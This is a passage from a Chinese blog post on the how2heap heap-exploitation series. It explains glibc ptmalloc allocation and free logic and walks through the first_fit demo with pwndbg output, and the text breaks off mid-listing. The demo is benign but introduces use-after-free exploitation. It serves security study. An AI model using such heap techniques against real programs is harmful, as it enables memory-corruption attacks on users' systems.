<!DOCTYPE html>
<html>
    <!-- title -->




<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="author" content="Tianji">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="Tianji">
    <meta name="keywords" content="how2heap-分析总结 | Tianji">
    <meta name="description" content="">
    <meta name="Cache-Control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>how2heap-分析总结 · Tianji&#39;s Blog</title>
    <!-- 设置密码 -->
    <script>
        (function(){
            if(''){
                if (prompt('请输入文章密码','') !== ''){
                    alert('密码错误！');
                    history.back();
                }
            }
        })();
    </script>
    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s 1;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }

</style>

    <link rel="preload" href="/css/style.css?v=20180721" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="stylesheet" href="/css/mobile.css?v=20180721" media="(max-width: 980px)">
    
    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
(function( w ){
	"use strict";
	// rel=preload support test
	if( !w.loadCSS ){
		w.loadCSS = function(){};
	}
	// define on the loadCSS obj
	var rp = loadCSS.relpreload = {};
	// rel=preload feature support test
	// runs once and returns a function for compat purposes
	rp.support = (function(){
		var ret;
		try {
			ret = w.document.createElement( "link" ).relList.supports( "preload" );
		} catch (e) {
			ret = false;
		}
		return function(){
			return ret;
		};
	})();

	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
	// then change that media back to its intended value on load
	rp.bindMediaToggle = function( link ){
		// remember existing media attr for ultimate state, or default to 'all'
		var finalMedia = link.media || "all";

		function enableStylesheet(){
			link.media = finalMedia;
		}

		// bind load handlers to enable media
		if( link.addEventListener ){
			link.addEventListener( "load", enableStylesheet );
		} else if( link.attachEvent ){
			link.attachEvent( "onload", enableStylesheet );
		}

		// Set rel and non-applicable media type to start an async request
		// note: timeout allows this to happen async to let rendering continue in IE
		setTimeout(function(){
			link.rel = "stylesheet";
			link.media = "only x";
		});
		// also enable media after 3 seconds,
		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
		setTimeout( enableStylesheet, 3000 );
	};

	// loop through link elements in DOM
	rp.poly = function(){
		// double check this to prevent external calls from running
		if( rp.support() ){
			return;
		}
		var links = w.document.getElementsByTagName( "link" );
		for( var i = 0; i < links.length; i++ ){
			var link = links[ i ];
			// qualify links to those with rel=preload and as=style attrs
			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
				// prevent rerunning on link
				link.setAttribute( "data-loadcss", true );
				// bind listeners to toggle media back
				rp.bindMediaToggle( link );
			}
		}
	};

	// if unsupported, run the polyfill
	if( !rp.support() ){
		// run once at least
		rp.poly();

		// rerun poly on an interval until onload
		var run = w.setInterval( rp.poly, 500 );
		if( w.addEventListener ){
			w.addEventListener( "load", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		} else if( w.attachEvent ){
			w.attachEvent( "onload", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		}
	}


	// commonjs
	if( typeof exports !== "undefined" ){
		exports.loadCSS = loadCSS;
	}
	else {
		w.loadCSS = loadCSS;
	}
}( typeof global !== "undefined" ? global : this ) );
</script>

    <link rel="icon" href="/assets/favicon.ico">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
    <link rel="preload" href="/scripts/main.js" as="script">
    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin="">
    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin="">
    
    <!-- fancybox -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
    <!-- 百度统计  -->
    
    <!-- 谷歌统计  -->
    
</head>

    
        <body class="post-body">
    
    
<header class="header">

    <div class="read-progress"></div>
    <div class="header-sidebar-menu">&#xe775;</div>
    <!-- post页的toggle banner  -->
    
    <div class="banner">
            <div class="blog-title">
                <a href="/">Tianji&#39;s Blog.</a>
            </div>
            <div class="post-title">
                <a href="#" class="post-name">how2heap-分析总结</a>
            </div>
    </div>
    
    <a class="home-link" href="/">Tianji's Blog.</a>
</header>
    <div class="wrapper">
        <div class="site-intro" style="height:50vh;">
    
    <!-- 主页  -->
    
    
    <!-- 404页  -->
            
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
            how2heap-分析总结
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
            
            <!-- 404 -->
            
        </p>
        <!-- 文章页meta -->
        
            <div class="post-intros">
                <!-- 文章页标签  -->
                
                    <div class="post-intro-tags">
    
        <a class="post-tag" href="javascript:void(0);" data-tags="pwn">pwn</a>
    
</div>
                
                
                    <div class="post-intro-read">
                        <span>Word count: <span class="post-count">20,119</span> / Reading time: <span class="post-count">109 min</span></span>
                    </div>
                
                <div class="post-intro-meta">
                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
                    <span class="post-intro-time">2018/08/06</span>
                    
                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                        <span class="iconfont-archer">&#xe602;</span>
                        <span id="busuanzi_value_page_pv"></span>
                    </span>
                    
                    <span class="shareWrapper">
                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
                        <span class="shareText">Share</span>
                        <ul class="shareList">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
        
    </div>
</div>
        <script>
 
  // get user agent
  var browser = {
    versions: function () {
      var u = window.navigator.userAgent;
      return {
        userAgent: u,
        trident: u.indexOf('Trident') > -1, //IE内核
        presto: u.indexOf('Presto') > -1, //opera内核
        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
        iPad: u.indexOf('iPad') > -1, //是否为iPad
        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
      };
    }()
  }
  console.log("userAgent:" + browser.versions.userAgent);

  // callback
  function fontLoaded() {
    console.log('font loaded');
    if (document.getElementsByClassName('site-intro-meta')) {
      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in');
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb(){
    if (browser.versions.uc) {
      console.log("UCBrowser");
      fontLoaded();
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular']
        },
        loading: function () {  //所有字体开始加载
          // console.log('loading');
        },
        active: function () {  //所有字体已渲染
          fontLoaded();
        },
        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout');
          fontLoaded();
        },
        timeout: 5000 // Set the timeout to two seconds
      });
    }
  }

  function asyncErr(){
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document, t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
    s.parentNode.insertBefore(o, s);
  }

  var asyncLoadWithFallBack = function(arr, success, reject) {
      var currReject = function(){
        reject()
        arr.shift()
        if(arr.length)
          async(arr[0], success, currReject)
        }

      async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack([
    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
    "/lib/webfontloader.min.js"
  ], asyncCb, asyncErr)
</script>        
        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;">
        <div class="container container-unloaded">
            <main class="main post-page">
    <article class="article-entry">
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>how2heap有了很大的变化，特在此学习，记录。</p>
<h1 id="内存分配概述"><a href="#内存分配概述" class="headerlink" title="内存分配概述"></a>内存分配概述</h1><p>摘自华庭大佬。</p>
<ol>
<li>分配算法概述，以 32 系统为例，64 位系统类似。</li>
</ol>
<ul>
<li>小于等于 64 字节：用 pool 算法分配。</li>
<li>64 到 512 字节之间：在最佳匹配算法分配和 pool 算法分配中取一种合适的。</li>
<li>大于等于 512 字节：用最佳匹配算法分配。</li>
<li>大于等于 mmap 分配阈值（默认值 128KB）：根据设置的 mmap 的分配策略进行分配，如果没有开启 mmap 分配阈值的动态调整机制，大于等于 128KB 就直接调用 mmap分配。否则，大于等于 mmap 分配阈值时才直接调用 mmap()分配。</li>
</ul>
<ol start="2">
<li><p>ptmalloc 的响应用户内存分配要求的具体步骤为:</p>
<p>获取分配区的锁，为了防止多个线程同时访问同一个分配区，在进行分配之前需要取得分配区域的锁。线程先查看线程私有实例中是否已经存在一个分配区，如果存在尝试对该分配区加锁，如果加锁成功，使用该分配区分配内存，否则，该线程搜索分配区循环链表试图获得一个空闲（没有加锁）的分配区。如果所有的分配区都已经加锁，那么 ptmalloc 会开辟一个新的分配区，把该分配区加入到全局分配区循环链表和线程的私有实例中并加锁，然后使用该分配区进行分配操作。开辟出来的新分配区一定为非主分配区，因为主分配区是从父进程那里继承来的。开辟非主分配区时会调用 mmap()创建一个 sub-heap，并设置好 top chunk。</p>
<ol>
<li>将用户的请求大小转换为实际需要分配的 chunk 空间大小。</li>
<li>判断所需分配chunk的大小是否满足chunk_size &lt;= max_fast (max_fast 默认为 64B)，如果是的话，则转下一步，否则跳到第 5 步。</li>
<li>首先尝试在 fast bins 中取一个所需大小的 chunk 分配给用户。如果可以找到，则分配结束。否则转到下一步。</li>
<li>判断所需大小是否处在 small bins 中，即判断 chunk_size &lt; 512B 是否成立。如果chunk 大小处在 small bins 中，则转下一步，否则转到第 6 步。</li>
<li>根据所需分配的 chunk 的大小，找到具体所在的某个 small bin，从该 bin 的尾部摘取一个恰好满足大小的 chunk。若成功，则分配结束，否则，转到下一步。</li>
<li>到了这一步，说明需要分配的是一块大的内存，或者 small bins 中找不到合适的chunk。于是，ptmalloc 首先会遍历 fast bins 中的 chunk，将相邻的 chunk 进行合并，并链接到 unsorted bin 中，然后遍历 unsorted bin 中的 chunk，如果 unsorted bin 只有一个 chunk，并且这个 chunk 在上次分配时被使用过，并且所需分配的 chunk 大小属于 small bins，并且 chunk 的大小大于等于需要分配的大小，这种情况下就直接将该 chunk 进行切割，分配结束，否则将根据 chunk 的空间大小将其放入 smallbins 或是 large bins 中，遍历完成后，转入下一步。</li>
<li>到了这一步，说明需要分配的是一块大的内存，或者 small bins 和 unsorted bin 中都找不到合适的 chunk，并且 fast bins 和 unsorted bin 中所有的 chunk 都清除干净了。从 large bins 中按照“smallest-first，best-fit”原则，找一个合适的 chunk，从中划分一块所需大小的 chunk，并将剩下的部分链接回到 bins 中。若操作成功，则分配结束，否则转到下一步。</li>
<li>如果搜索 fast bins 和 bins 都没有找到合适的 chunk，那么就需要操作 top chunk 来进行分配了。判断 top chunk 大小是否满足所需 chunk 的大小，如果是，则从 topchunk 中分出一块来。否则转到下一步。</li>
<li>到了这一步，说明 top chunk 也不能满足分配要求，所以，于是就有了两个选择: 如果是主分配区，调用 sbrk()，增加 top chunk 大小；如果是非主分配区，调用 mmap来分配一个新的 sub-heap，增加 top chunk 大小；或者使用 mmap()来直接分配。在这里，需要依靠 chunk 的大小来决定到底使用哪种方法。判断所需分配的 chunk大小是否大于等于 mmap 分配阈值，如果是的话，则转下一步，调用 mmap 分配，否则跳到第 12 步，增加 top chunk 的大小。</li>
<li>使用 mmap 系统调用为程序的内存空间映射一块 chunk_size align 4kB 大小的空间。然后将内存指针返回给用户。</li>
<li>判断是否为第一次调用 malloc，若是主分配区，则需要进行一次初始化工作，分配一块大小为(chunk_size + 128KB) align 4KB 大小的空间作为初始的 heap。若已经初始化过了，主分配区则调用 sbrk()增加 heap 空间，分主分配区则在 top chunk 中切割出一个 chunk，使之满足分配需求，并将内存指针返回给用户。</li>
</ol>
</li>
</ol>
<p>总结一下：根据用户请求分配的内存的大小，ptmalloc 有可能会在两个地方为用户分配内存空间。在第一次分配内存时，一般情况下只存在一个主分配区，但也有可能从父进程那里继承来了多个非主分配区，在这里主要讨论主分配区的情况，brk 值等于start_brk，所以实际上 heap 大小为 0，top chunk 大小也是 0。这时，如果不增加 heap大小，就不能满足任何分配要求。所以，若用户的请求的内存大小小于 mmap 分配阈值，则 ptmalloc 会初始 heap。然后在 heap 中分配空间给用户，以后的分配就基于这个 heap进行。若第一次用户的请求就大于 mmap 分配阈值，则 ptmalloc 直接使用 mmap()分配一块内存给用户，而 heap 也就没有被初始化，直到用户第一次请求小于 mmap 分配阈值的内存分配。第一次以后的分配就比较复杂了，简单说来，ptmalloc 首先会查找fast bins，如果不能找到匹配的 chunk，则查找 small bins。若还是不行，合并 fast bins，把 chunk加入 unsorted bin，在 unsorted bin 中查找，若还是不行，把 unsorted bin 中的 chunk 全加入 large bins 中，并查找 large bins。在 fast bins 和 small bins 中的查找都需要精确匹配，而在 large bins 中查找时，则遵循“smallest-first，best-fit”的原则，不需要精确匹配。若以上方法都失败了，则 ptmalloc 会考虑使用 top chunk。若 top chunk 也不能满足分配要求。而且所需 chunk 大小大于 mmap 分配阈值，则使用 mmap 进行分配。否则增加heap，增大 top chunk。以满足分配要求。</p>
<h1 id="内存回收概述"><a href="#内存回收概述" class="headerlink" title="内存回收概述"></a>内存回收概述</h1><p>free() 函数接受一个指向分配区域的指针作为参数，释放该指针所指向的 chunk。而具体的释放方法则看该 chunk 所处的位置和该 chunk 的大小。free()函数的工作步骤如下：</p>
<ul>
<li>free()函数同样首先需要获取分配区的锁，来保证线程安全。</li>
<li>判断传入的指针是否为 0，如果为 0，则什么都不做，直接 return。否则转下一步。</li>
<li>判断所需释放的 chunk 是否为 mmaped chunk，如果是，则调用 munmap()释放mmaped chunk，解除内存空间映射，该该空间不再有效。如果开启了 mmap 分配阈值的动态调整机制，并且当前回收的 chunk 大小大于 mmap 分配阈值，将 mmap分配阈值设置为该 chunk 的大小，将 mmap 收缩阈值设定为 mmap 分配阈值的 2倍，释放完成，否则跳到下一步。</li>
<li>判断 chunk 的大小和所处的位置，若 chunk_size &lt;= max_fast，并且 chunk 并不位于heap 的顶部，也就是说并不与 top chunk 相邻，则转到下一步，否则跳到第 6 步。（因为与 top chunk 相邻的小 chunk 也和 top chunk 进行合并，所以这里不仅需要判断大小，还需要判断相邻情况）</li>
<li>将 chunk 放到 fast bins 中，chunk 放入到 fast bins 中时，并不修改该 chunk 使用状态位 P。也不与相邻的 chunk 进行合并。只是放进去，如此而已。这一步做完之后释放便结束了，程序从 free()函数中返回。</li>
<li>判断前一个 chunk 是否处在使用中，如果前一个块也是空闲块，则合并。并转下一步。</li>
<li>判断当前释放 chunk 的下一个块是否为 top chunk，如果是，则转第 9 步，否则转下一步。</li>
<li>判断下一个 chunk 是否处在使用中，如果下一个 chunk 也是空闲的，则合并，并将合并后的 chunk 放到 unsorted bin 中。注意，这里在合并的过程中，要更新 chunk的大小，以反映合并后的 chunk 的大小。并转到第 10 步。</li>
<li>如果执行到这一步，说明释放了一个与 top chunk 相邻的 chunk。则无论它有多大，都将它与 top chunk 合并，并更新 top chunk 的大小等信息。转下一步。</li>
<li>判断合并后的 chunk 的大小是否大于 FASTBIN_CONSOLIDATION_THRESHOLD（默认64KB），如果是的话，则会触发进行 fast bins 的合并操作，fast bins 中的 chunk 将被遍历，并与相邻的空闲 chunk 进行合并，合并后的 hunk 会被放到 unsorted bin 中。fast bins 将变为空，操作完成之后转下一步。</li>
<li>判断 top chunk 的大小是否大于 mmap 收缩阈值（默认为 128KB），如果是的话，对于主分配区，则会试图归还 top chunk 中的一部分给操作系统。但是最先分配的128KB 空间是不会归还的，ptmalloc 会一直管理这部分内存，用于响应用户的分配请求；如果为非主分配区，会进行 sub-heap 收缩，将 top chunk 的一部分返回给操作系统，如果 top chunk 为整个 sub-heap，会把整个 sub-heap 还回给操作系统。做完这一步之后，释放结束，从 free() 函数退出。可以看出，收缩堆的条件是当前free 的 chunk 大小加上前后能合并 chunk 的大小大于 64k，并且要 top chunk 的大小要达到 mmap 收缩阈值，才有可能收缩堆。</li>
</ul>
<h1 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"glibc uses a first-fit algorithm to select a free chunk.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If a chunk is free and large enough, malloc will select this chunk.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This can be exploited in a use-after-free situation.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 2 buffers. They can be large, don't have to be fastbin.\n"</span>);</span><br><span class="line">	<span class="keyword">char</span>* a = <span class="built_in">malloc</span>(<span class="number">512</span>);</span><br><span class="line">	<span class="keyword">char</span>* b = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">	<span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(512): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(256): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"we could continue mallocing here...\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"now let's put a string at a that we can read later \"this is A!\"\n"</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(a, <span class="string">"this is A!"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We don't need to free anything again. As long as we allocate less than 512, it will end up at %p\n"</span>, a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, let's allocate 500 bytes\n"</span>);</span><br><span class="line">	c = <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(500): %p\n"</span>, c);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And put a different string here, \"this is C!\"\n"</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(c, <span class="string">"this is C!"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd allocation %p points to %s\n"</span>, c, c);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we reuse the first allocation, it now holds the data from the third allocation."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>分配两个块，a块512B, b块256B，并在a块中写入”This is A!”</li>
<li>释放a块，a块将会被放到unsorted bin中</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">   22 	fprintf(stderr, "first allocation %p points to %s\n", a, a);</span><br><span class="line">   23 </span><br><span class="line">   24 	fprintf(stderr, "Freeing the first one...\n");</span><br><span class="line">   25 	free(a);</span><br><span class="line">   26 </span><br><span class="line"> ► 27 	fprintf(stderr, "We don't need to free anything again. As long as we allocate less than 512, it will end up at %p\n", a);</span><br><span class="line">   28 </span><br><span class="line">   29 	fprintf(stderr, "So, let's allocate 500 bytes\n");</span><br><span class="line">   30 	c = malloc(500);</span><br><span class="line">   31 	fprintf(stderr, "3rd malloc(500): %p\n", c);</span><br><span class="line">   32 	fprintf(stderr, "And put a different string here, \"this is C!\"\n");</span><br><span class="line">─────────────────────────────────────[ STACK ]─────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffdd60 —▸ 0x4008f0 (__libc_csu_init) ◂— push   r15</span><br><span class="line">01:0008│      0x7fffffffdd68 —▸ 0x603010 —▸ 0x7ffff7dd1b78 (main_arena+88) —▸ 0x603320 ◂— 0x0</span><br><span class="line">02:0010│      0x7fffffffdd70 —▸ 0x603220 ◂— 0x0</span><br><span class="line">03:0018│      0x7fffffffdd78 ◂— 0x0</span><br><span class="line">04:0020│ rbp  0x7fffffffdd80 —▸ 0x4008f0 (__libc_csu_init) ◂— push   r15</span><br><span class="line">05:0028│      0x7fffffffdd88 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">06:0030│      0x7fffffffdd90 ◂— 0x0</span><br><span class="line">07:0038│      0x7fffffffdd98 —▸ 0x7fffffffde68 —▸ 0x7fffffffe208 ◂— 0x69712f656d6f682f ('/home/qi')</span><br><span class="line">───────────────────────────────────[ BACKTRACE ]───────────────────────────────────</span><br><span class="line"> ► f 0           4007dc main+406</span><br><span class="line">   f 1     7ffff7a2d830 __libc_start_main+240</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> bins</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b78 (main_arena+88) —▸ 0x603000 ◂— 0x7ffff7dd1b78</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<ul>
<li>分配c块，500B</li>
</ul>
<p>注意:</p>
<ul>
<li>Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，<strong>即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong>。</li>
<li>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。</li>
</ul>
<p>当程序再一次 malloc 一个大小与我们 free 掉的chunk 大小差不多的 chunk ，系统会优先从 bins 里找到一个合适的 chunk 把他取出来再使用。写入’this is C’</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">   26 </span><br><span class="line">   27 	fprintf(stderr, &quot;We don&apos;t need to free anything again. As long as we allocate less than 512, it will end up at %p\n&quot;, a);</span><br><span class="line">   28 </span><br><span class="line">   29 	fprintf(stderr, &quot;So, let&apos;s allocate 500 bytes\n&quot;);</span><br><span class="line">   30 	c = malloc(500);</span><br><span class="line"> ► 31 	fprintf(stderr, &quot;3rd malloc(500): %p\n&quot;, c);</span><br><span class="line">   32 	fprintf(stderr, &quot;And put a different string here, \&quot;this is C!\&quot;\n&quot;);</span><br><span class="line">   33 	strcpy(c, &quot;this is C!&quot;);</span><br><span class="line">   34 	fprintf(stderr, &quot;3rd allocation %p points to %s\n&quot;, c, c);</span><br><span class="line">   35 	fprintf(stderr, &quot;first allocation %p points to 